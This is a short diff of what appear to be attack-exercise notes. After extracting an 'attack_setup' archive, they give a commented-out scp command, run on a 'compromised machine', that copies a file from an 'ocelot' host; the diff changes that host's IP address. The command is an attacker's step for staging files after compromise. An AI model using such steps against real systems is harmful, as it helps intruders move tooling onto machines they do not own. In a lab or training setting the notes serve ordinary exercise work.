@@ -30,8 +30,8 @@ decompress the directory we just got in
 tar -xzvf attack_setup.tar.gz
 
 On compromised machine
-#scp ocelot@172.24.24.101:/path/to/remote/file.txt /path/to/local/directory/
-
+#scp ocelot@10.50.160.17:/path/to/remote/file.txt /path/to/local/directory/
+(or whatever 10.50 address is on the ocelot box)
 
 
 
